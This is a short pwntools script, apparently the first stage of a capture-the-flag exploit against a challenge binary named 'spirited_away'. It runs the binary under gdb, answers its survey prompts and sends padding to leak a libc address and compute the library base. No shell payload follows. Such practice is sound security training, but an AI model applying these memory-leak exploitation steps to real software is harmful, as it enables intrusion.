from pwn import *


spirited_away = ELF('spirited_away')
libc = ELF('libc_32.so.6')


class Prompts:
    NAME = 'name: '
    AGE = 'age: '
    REASON = 'movie? '
    COMMENT = 'comment: '


p = gdb.debug(
    spirited_away.path,
    '''
    b *survey+235
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def leak_libc():
    p.sendafter(Prompts.NAME, 'egk')
    p.sendlineafter(Prompts.AGE, '19')
    p.sendafter(Prompts.REASON, 'A' * 0x14)
    p.sendafter(Prompts.COMMENT, 'skurrt')
    p.recvn(0x2e)
    libc.address = u32(p.recvn(4)) - 0x5f29b


def main():
    leak_libc()


if __name__ == "__main__":
    main()
